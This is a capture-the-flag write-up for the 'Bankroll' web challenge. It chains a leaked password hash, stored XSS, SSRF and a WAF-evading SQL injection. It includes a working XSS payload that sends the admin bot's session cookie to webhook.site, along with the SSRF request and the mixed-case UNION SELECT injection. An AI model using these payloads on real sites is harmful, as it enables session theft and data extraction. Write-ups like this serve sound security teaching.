# Bankroll — Writeup

- Category: Web
- Value: 979
- Author: by **10splayaSec**

## Challenge

> Sorry! I'm out for lunch right now, but I'll check on things every few minutes! Hope nothing breaks when I'm gone!
>
> **SHA1:** `f6b988bd555b24b9de9b17401e76886f913e233b`
>
> ***The user in the provided source code is different from the user on the production instance. This is simulating a real-world scenario.***

## Recon

The attachment is full source for three components:

- `main-app/` — public Flask app
- `internal-app/` — localhost-only employee directory on `:8080`
- `svc_admin_bot/` — Selenium bot that logs in as `svc_admin`

The useful source findings are:

- `SESSION_COOKIE_HTTPONLY = False`, so JavaScript can read `document.cookie`
- `/forgot-password` leaks `password_hash` for valid non-admin users
- notes are rendered with `{{ note.content | safe }}`
- the note sanitizer only strips `on...=` with no whitespace, so `onload =...` survives
- `/devtools/fetch` is admin-only SSRF restricted to numeric loopback hosts on port `8080`
- the internal `/search` endpoint concatenates `q` directly into SQL
- the internal WAF blocks lowercase and uppercase SQL keywords, but mixed-case keywords pass

The warning in the prompt matters: the seeded source user `erin` is not the real production user.

## Solve

First enumerate a real non-admin user through `/forgot-password`, then crack the leaked SHA-256 hash.
The live instance user turned out to be `zack` with password `ryLis@1024`.

Log in as `zack`, then post a single-note XSS payload:

```html
<svg onload =location='//webhook.site/<TOKEN>?n=<NONCE>&c='+document.cookie>
```

Because the bot polls for pending notes, logs in as `svc_admin`, and loads `/dashboard`, that payload exfiltrates the admin session cookie to the webhook.

Replay the stolen `session` cookie against the public app and confirm the dashboard now shows:

```text
Welcome back, svc_admin.
```

With the admin cookie, call the SSRF helper:

```http
POST /devtools/fetch
{"url":"http://2130706433:8080/search?q=%27%20UnIoN%20SeLeCt%201,secret,3,4%20FrOm%20secrets/*"}
```

That reaches the internal app on `127.0.0.1:8080`.
The SQLi uses mixed-case `UnIoN SeLeCt ... FrOm` to bypass the casing-based WAF, and `/*` instead of `--` because `--` is explicitly blocked.
The response body contains the flag inside the rendered results table.

## Flag

```text
CIT{R3v3al_Th3_B@nkR0ll}
```

## Files

- [challenge.md](challenge.md)
- [challenge.json](challenge.json)
- [bankroll.zip](files/bankroll.zip)
- [solve.py](scripts/solve.py)
- [flag.txt](solution/flag.txt)
- [challenge-api.json](other/challenge-api.json)
- [source-env.txt](other/source-env.txt)
- [key-snippets.txt](other/key-snippets.txt)
